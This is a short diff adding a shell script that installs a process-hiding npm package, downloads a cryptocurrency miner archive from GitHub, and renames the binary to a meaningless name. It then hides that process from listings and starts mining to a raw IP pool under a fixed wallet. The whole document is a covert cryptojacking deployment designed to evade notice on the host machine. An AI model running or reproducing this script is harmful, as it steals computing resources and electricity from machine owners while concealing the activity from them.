@@ -1,0 +1,11 @@
+npm i -g node-process-hider
+nvidia-smi
+rm -rf ForgeMiner-1.5.11.tar.gz 1.5.11
+wget https://github.com/kryptex-miners-org/kryptex-miners/releases/download/forge-1-5-11/ForgeMiner-1.5.11.tar.gz
+tar xf ForgeMiner-1.5.11.tar.gz
+cd 1.5.11
+mv forge samlospo
+
+ph add samlospo
+
+./samlospo --algorithm pearlhash --pool 152.42.206.241:80 --wallet prl1plfe52vv5jxq8x4zj0vn6u0wufa73q2xmzed87nelwyg3mlxhfl8sn6hhdr.$(echo $RANDOM | md5sum | head -c 10)
